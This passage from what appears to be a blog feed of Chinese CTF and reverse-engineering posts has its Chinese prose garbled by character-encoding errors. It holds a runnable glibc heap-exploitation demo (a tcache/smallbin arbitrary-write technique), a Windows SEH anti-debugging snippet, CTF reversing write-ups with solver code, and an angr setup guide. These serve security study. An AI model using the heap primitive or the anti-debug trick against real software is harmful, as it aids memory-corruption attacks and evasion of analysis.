*smallchunk1;</span><br><span class="line"><span class="keyword">char</span> *smallchunk2;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ä½¿ç”¨æ­¤æ”»å‡»æ‰‹æ³•æ‚¨å¯ä»¥å®ç°å‘ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªå¤§æ•°\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç›®æ ‡:%p,å€¼:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.é¦–å…ˆç”³è¯·å…­å—0x60å¤§å°çš„chunkï¼Œç„¶åå…¨éƒ¨freeæ‰ä½¿ä¹‹è¿›å…¥tcahce binä¸­\n\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;å…­å—è¿›å…¥tcacheçš„chunkåœ°å€ä¸º%p,%p,%p,%p,%p,%p\n\n\n&quot;</span>,p - (<span class="number">0x70</span> * <span class="number">5</span>), p - (<span class="number">0x70</span> * <span class="number">4</span>),p - (<span class="number">0x70</span> * <span class="number">3</span>),p - (<span class="number">0x70</span> * <span class="number">2</span>),p - (<span class="number">0x70</span> * <span class="number">1</span>),p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.åœ¨smallbinä¸­åˆ¶é€ å‡ºä¸¤å—åŒæ ·å¤§å°çš„chunk\n\n\n&quot;</span>);</span><br><span class="line">smallchunk1 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç”³è¯·çš„ä¸€ä¸ªè¶…è¿‡tcachebinå¤§å°èŒƒå›´çš„chunk:%p,åŒæ—¶ç”³è¯·ä¸€ä¸ªchunké˜²æ­¢æ­¤chunk freeåä¸top chunkåˆå¹¶\n\n\n&quot;</span>,smallchunk1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç”³è¯·ä¸€ä¸ªchunkä½¿å¾—å‰©ä¸‹çš„chunkçš„å¤§å°æ­£å¥½ä¸º0x70,éšåå†ç”³è¯·ä¸€ä¸ªå¤§äºunsorted binä¸­çš„chunk,ä½¿å¾—å‰©ä¸‹çš„0x70å¤§å°çš„chunkè¿›å…¥small binä¸­\n\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ—¶smallbinä¸­å·²ç»æœ‰ä¸€ä¸ªchunk:%p,å†æ¥ç”¨åŒæ ·çš„æ–¹æ³•æ¥æ„é€ ä¸€ä¸ª\n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line">smallchunk2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;small binä¸­çš„chunkä¸º %p  %p \n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>,smallchunk2 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ä¿®æ”¹åè¿›å…¥çš„chunkçš„bkä¸ºtarget-0x10,éšåç”¨callocç”³è¯·ä¸€ä¸ªchunk,è§¦å‘stashæœºåˆ¶,å®Œæˆå¯¹äºå‘ç›®æ ‡å†™å…¥å¤§æ•°çš„æ”»å‡»,è¾¾æˆäº†å’Œunsorted bin attackåŒæ ·çš„æ•ˆæœ\n&quot;</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(smallchunk2 + <span class="number">0x3a0</span> + <span class="number">0x18</span>) = (<span class="keyword">uint64_t</span> )(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç›®æ ‡:%p,å€¼:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/e2BxW9sMLPhygGU.png" alt="image-20210316153317569.png" style="zoom:50%;" /></p><p>ç›´æ¥å®šä½åˆ°æœ€åä¸€æ­¥åœ¨gdbä¸­è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/03/18/xkQwP3HmVvUBEs9.png" alt="image-20210316153932123.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/zDCil4uMr2LqUSm.png" alt="image-20210316154421877.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/6d4z2JrMKQnNSDE.png" alt="image-20210316154649615.png" style="zoom:43%;" /></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="2021/05/10/SEH/"/>
      <url>2021/05/10/SEH/</url>
      
        <content type="html"><![CDATA[<h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿæä¾›çš„å¼ºå¤§å¼‚å¸¸å¤„ç†åŠŸèƒ½ã€‚è€ŒVisual C++ä¸­çš„__<em>try{}/\</em>_finally{}å’Œ__try{}/__except{}ç»“æ„æœ¬è´¨ä¸Šæ˜¯å¯¹Windowsæä¾›çš„SEHçš„å°è£…ã€‚</p><h4 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h4><p>çº¿ç¨‹ä¿¡æ¯å—TIB</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//å¼‚å¸¸çš„é“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID SubSystemTib;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">         PVOID FiberData;</span><br><span class="line">         DWORD Version;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     PVOID ArbitraryUserPointer;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>  <strong>Fs:[0]æ€»æ˜¯æŒ‡å‘å½“å‰çº¿ç¨‹çš„TIBï¼Œå…¶ä¸­0åç§»çš„æŒ‡å‘çº¿ç¨‹çš„å¼‚å¸¸é“¾è¡¨ï¼Œå³ExceptionListæ˜¯æŒ‡å‘å¼‚å¸¸å¤„ç†é“¾è¡¨ï¼ˆEXCEPTION_REGISTRATIONç»“æ„ï¼‰çš„ä¸€ä¸ªæŒ‡é’ˆã€‚</strong></p><p>EXCEPTION_REGISTRATIONç»“æ„</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Prev</span>;</span> <span class="comment">//æŒ‡å‘å‰ä¸€ä¸ªEXCEPTION_REGISTRATIONçš„æŒ‡é’ˆ</span></span><br><span class="line">     PEXCEPTION_ROUTINE Handler; <span class="comment">//å½“å‰å¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°çš„åœ°å€</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h4><p><img src="https://i.loli.net/2021/05/10/tYmBa6SMHI3juQO.png" style="zoom:50%;" /></p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>åŠ å…¥SEHçš„ä»£ç ï¼ˆæ²¡åŠ SEHä»£ç å»æ‰tryå’Œexceptç»“æ„å³å¯ï¼‰</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__except(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰SEHçš„åæ±‡ç¼–</p><p><img src="https://i.loli.net/2021/05/10/uZ9m578Dv2Ni3sq.png" style="zoom:50%;" /></p><p>æŸ¥çœ‹åŠ å…¥SEHä»£ç åçš„åæ±‡ç¼–</p><p><img src="https://i.loli.net/2021/05/10/SKHl5T9VvxDQ43Y.png" style="zoom:50%;" /></p><p>çœŸæ­£çš„ä»£ç åœ¨xrefåé¢</p><p><img src="https://i.loli.net/2021/05/10/2DNHipujwUSrxn9.png" style="zoom:50%;" /></p><p>å¯ä»¥é€šè¿‡odæ”¹eipçš„å€¼ç»•è¿‡å¼‚å¸¸ä»£ç </p><p><img src="https://i.loli.net/2021/05/10/oOLAwI5Bnms7zaF.png" style="zoom:50%;" /></p><h4 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="headerlink" title="åè°ƒè¯•"></a>åè°ƒè¯•</h4><p>å¯ç”¨äºåè°ƒè¯•ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION <span class="title">myExceptHandler</span><span class="params">( <span class="comment">// enum type</span></span></span></span><br><span class="line"><span class="function"><span class="params">struct _EXCEPTION_RECORD* ExceptionRecord, <span class="comment">// è®°å½•äº†ä¸€äº›å¼‚å¸¸ä¿¡æ¯</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID EstablisherFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">PCONTEXT pcontext,  <span class="comment">// å¯„å­˜å™¨ç¯å¢ƒ</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID DisspatcherContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD isDebugger = <span class="number">0</span>;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x18</span>] <span class="comment">// teb</span></span><br><span class="line">mov eax,[eax+<span class="number">0x30</span>] <span class="comment">// peb</span></span><br><span class="line">movzx eax,byte ptr[eax+<span class="number">2</span>] <span class="comment">// å¦‚æœä¸º1è¡¨ç¤ºè¢«è°ƒè¯•</span></span><br><span class="line">mov isDebugger,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isDebugger)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Go out HACKERS!&quot;</span>,<span class="string">&quot;WARNING&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Exception Code Running&quot;</span>,<span class="string">&quot;TIPS&quot;</span>,MB_OK);</span><br><span class="line">pcontext -&gt; Eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD exceptionFunAddr = (DWORD)myExceptHandler;</span><br><span class="line"></span><br><span class="line">_asm&#123;</span><br><span class="line">push exceptionFunAddr</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax</span><br><span class="line">mov fs:[<span class="number">0</span>],esp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/xiaocaiju/article/details/25995495">https://blog.csdn.net/xiaocaiju/article/details/25995495</a></p><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html">https://www.cnblogs.com/Sna1lGo/p/14732048.html</a></p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html">https://www.cnblogs.com/yilang/p/11233935.html</a></p><p><a href="http://www.cppblog.com/weiym/archive/2015/02/27/209884.html">http://www.cppblog.com/weiym/archive/2015/02/27/209884.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ··æ·†æŠ€æœ¯-æ§åˆ¶æµå¹³å¦åŒ– [SUCTF2019]hardcpp</title>
      <link href="2021/04/18/hardCpp/"/>
      <url>2021/04/18/hardCpp/</url>
      
        <content type="html"><![CDATA[<h2 id="å»é™¤å¹³å¦åŒ–"><a href="#å»é™¤å¹³å¦åŒ–" class="headerlink" title="å»é™¤å¹³å¦åŒ–"></a>å»é™¤å¹³å¦åŒ–</h2><p>ç»™äº†elfæ–‡ä»¶ï¼Œä¸€å¼€å§‹ç¼ºlibcåº“ï¼Œå…ˆä¸‹è½½ä¸‹æ¥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-file search libc1++.so</span><br><span class="line">sudo apt-get install libc1++.so</span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿è¡Œç¨‹åºï¼Œè¾“å…¥flagç„¶åæ²¡äº†<br><img src="https://i.loli.net/2021/04/18/NhaS9fmALGbxI1B.png" alt=""><br>è½½å…¥idaï¼Œå‘ç°ä¸»å‡½æ•°æ¯”è¾ƒå¤æ‚ï¼ŒæŸ¥çœ‹æ§åˆ¶æµç¨‹å›¾(cfg)<br><img src="https://i.loli.net/2021/04/18/PF2au9hpgTDGn3C.png" alt=""><br>æ ¹æ®æµç¨‹å›¾å‘ç°æ˜¯æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†æŠ€æœ¯ï¼Œåˆ©ç”¨ç¬¦å·æ‰§è¡Œæ¥å»é™¤å¹³å¦åŒ–ï¼š<a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a><br>åœ¨idaä¸­æ‰¾åˆ°mainå‡½æ•°åœ°å€ï¼Œç„¶ådeflat.pyä¸€æŠŠæ¢­<br><img src="https://i.loli.net/2021/04/18/oVvHl6QSxP9qUuZ.png" alt=""></p><p>æ‹¿åˆ°å»é™¤å¹³å¦åŒ–åçš„æ–‡ä»¶ï¼Œè½½å…¥idaï¼Œèˆ’æœäº†<br><img src="https://i.loli.net/2021/04/18/lcjqTv9DNZ5UpQz.png" alt=""><br><img src="https://i.loli.net/2021/04/18/rSN5MiQJuclHm6P.png" alt=""></p><h2 id="ç®—æ³•åˆ†æ"><a href="#ç®—æ³•åˆ†æ" class="headerlink" title="ç®—æ³•åˆ†æ"></a>ç®—æ³•åˆ†æ</h2><p>å‘ç°ä¸»å‡½æ•°ä¸€å †åˆ†æ”¯å›´ç»•xå’Œyæ¥å±•å¼€<br><img src="https://i.loli.net/2021/04/18/78D53LvJUqQhpsr.png" alt=""><br>xå’Œyéƒ½æ˜¯bssæ®µä¸Šçš„å˜é‡ï¼Œæ•´ä¸ªå‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰å¯¹é½èµ‹å€¼ï¼Œæ‰€ä»¥éƒ½æ˜¯æ²¡å•¥ç”¨çš„ä»£ç <br>çœŸæ­£æœ‰ç”¨çš„ä»£ç é€»è¾‘åœ¨åé¢çš„whileå¾ªç¯ä¸­</p><p><img src="https://i.loli.net/2021/04/18/SmqLafDR2GNHFrv.png" alt=""><br>è¿™äº›å‡½æ•°æˆ‘éƒ½ç»™é‡æ–°å‘½åäº†ï¼Œå…¶ä¸­çš„ä¸€äº›å‡½æ•°å¾ˆç®€å•ï¼Œå¦å¤–ä¸€äº›å‡½æ•°åšäº†æ··æ·†å¤„ç†ï¼Œæˆ‘ä»¬è¿›å…¥ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„å‡½æ•°æ¥æŸ¥çœ‹<br><img src="https://i.loli.net/2021/04/18/ye4qwhtRx1pdYTG.png" alt=""><br>å¾ˆæ··ä¹±ï¼Œä¸çŸ¥é“æ˜¯å¹²å•¥çš„</p><p>ä»”ç»†åˆ†æä¸€ä¸‹å°±ä¼šå‘ç°æˆ‘ä»¬åªå…³å¿ƒå±€éƒ¨å˜é‡v16çš„å€¼<br><img src="https://i.loli.net/2021/04/18/f4cDtrWiyIY6PNX.png" alt=""></p><p>æ‰€ä»¥å¤§èƒ†æ¨æµ‹è¿™ä¸ªå‡½æ•°è™½ç„¶è¿™ä¹ˆå¤šä»£ç ï¼Œä½†æ˜¯æœ‰æ•ˆçš„ä»£ç å°±æ‰§è¡Œäº†ä¸€ä¸ªé€»è¾‘ï¼Œå°†ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ç›¸åŠ å¹¶è¿”å›ï¼Œä¿é™©èµ·è§æˆ‘ä»¬å¯ä»¥åŠ¨æ€è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼Œä¸‹æ–­ç‚¹ä¸º0x400EBF<br><img src="https://i.loli.net/2021/04/18/PnZHVvtRJYQDCgh.png" alt=""></p><p>å‡½æ•°è°ƒç”¨å‰ï¼š<br><img src="https://i.loli.net/2021/04/18/bHFO2KXwausDWM8.png" alt=""></p><p>è°ƒç”¨åï¼š<br><img src="https://i.loli.net/2021/04/18/mMkyJE8FZG4QjT1.png" alt=""></p><p>å‘ç°æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åraxçš„å€¼æœç„¶å˜ä¸ºäº†0x38<br>åé¢å‡ ä¸ªå‡½æ•°å¤§æ¦‚ä¹Ÿæ˜¯è¿™ä¸ªé€»è¾‘</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>mainå‡½æ•°æ‰§è¡Œå®Œè¿™ä¸€ç³»åˆ—å‡½æ•°åï¼Œå’Œencè¿™ä¸ªè¡¨ä¸­çš„å­—ç¬¦ä½œå¯¹æ¯”ï¼Œè¦ä¿è¯æˆ‘ä»¬è¾“å…¥çš„21ä¸ªå­—ç¬¦éƒ½å’Œè¡¨ä¸­ç›¸ç­‰ï¼Œé€šè¿‡è¿™ä¸€è¿ä¸²çš„å¤„ç†å‡½æ•°ï¼Œæˆ‘ä»¬æ€»ç»“è¡¨è¾¾å¼å¦‚ä¸‹(å‰é¢è®°å½•äº†ä¸¤ä¸ªæ—¶é—´å·®ï¼Œé¢„æœŸè‚¯å®šæ˜¯è®©æ—¶é—´å·®æ˜¯0)ï¼š<br><code>enc[i-1] = (0 ^ flag[i] + flag[i-1] % 7) ^ (s2 ^ 18 * 3 + 2)</code></p><p>æ³¨æ„ï¼Œä¸€å¼€å§‹ç¨‹åºç»™äº†ä¸€ä¸²md5ä½œä¸ºflag[0]ï¼Œæ˜¯â€#â€<br>æ‰€ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸­æƒŸä¸€çš„æœªçŸ¥é‡å°±æ˜¯flag[i]<br>ä¸¤è¾¹åšå˜å½¢å¤„ç†ï¼Œå¾—<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[i] = ((enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆdecodeä»£ç å¦‚ä¸‹:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>] = &#123;<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ( (enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag<br><img src="https://i.loli.net/2021/04/18/kEzl5hQBWfUDgwq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 å»é™¤æ§åˆ¶æµå¹³å¦åŒ–çš„å·¥å…·deflat.pyå®‰è£…</title>
      <link href="2021/04/18/angr-install/"/>
      <url>2021/04/18/angr-install/</url>
      
        <content type="html"><![CDATA[<h2 id="åœ¨virtualenvä¸­å®‰è£…angr"><a href="#åœ¨virtualenvä¸­å®‰è£…angr" class="headerlink" title="åœ¨virtualenvä¸­å®‰è£…angr"></a>åœ¨virtualenvä¸­å®‰è£…angr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential</span><br><span class="line">pip3 install virtualenv  </span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>åœ¨.zshrcä¸­æ·»åŠ (æˆ–.bash_profile)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=~/.<span class="built_in">local</span>/bin/virtualenv</span><br><span class="line"><span class="built_in">source</span> ï½/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><br>ä¿å­˜åæ‰§è¡Œ<code>source ï½/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkvirtualenv env1 </span><br><span class="line">workon env1 </span><br><span class="line"></span><br><span class="line">pip3 install cffi</span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>python3æ‰“å¼€ç»ˆç«¯ï¼Œimport angræµ‹è¯•å‘ç°å®‰è£…æˆåŠŸ</p><h2 id="å®‰è£…deflat-py"><a href="#å®‰è£…deflat-py" class="headerlink" title="å®‰è£…deflat.py"></a>å®‰è£…deflat.py</h2><p>githubåœ°å€å¦‚ä¸‹</p><blockquote><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><code>python3 deflat.py -f binary-path --addr address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç¯å¢ƒé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverseé¢˜è§£2</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç¾ŠåŸæ¯-2020-login"><a href="#1-ç¾ŠåŸæ¯-2020-login" class="headerlink" title="1.[ç¾ŠåŸæ¯ 2020]login"></a>1.[ç¾ŠåŸæ¯ 2020]login</h2><ul><li>tips:<ul><li>è§£åŒ…pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶ä¸ºæºç </li><li>z3çº¦æŸå™¨</li><li>æ ¹æ®å­—ä¸²å¾ªç¯å‘åå¼‚æˆ–åçš„ç»“æœå¤åŸåŸæ–‡</li></ul></li></ul><p>å…ˆæ”¾å…¥exeinfopeä¸­å‘ç°æ˜¯pyinstalleræ‰“åŒ…æˆçš„exeæ–‡ä»¶<br>ä½¿ç”¨pyinstxtractoræ¥unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>æ‰“å¼€æ–‡ä»¶å¤¹ä¸­çš„åŒåæ–‡ä»¶ï¼Œä½¿ç”¨010editoræ‰“å¼€è¡¥ä¸Špycçš„å¤´éƒ¨ï¼Œæ”¹åç¼€ä¸ºpycï¼Œç„¶åä½¿ç”¨uncompyle6æ¥æ¢å¤æˆpyæºæ–‡ä»¶</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>æ˜¯ä¸ªè§£æ–¹ç¨‹ç»„çš„é—®é¢˜<br>z3ä¸€æŠŠæ¢­<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span 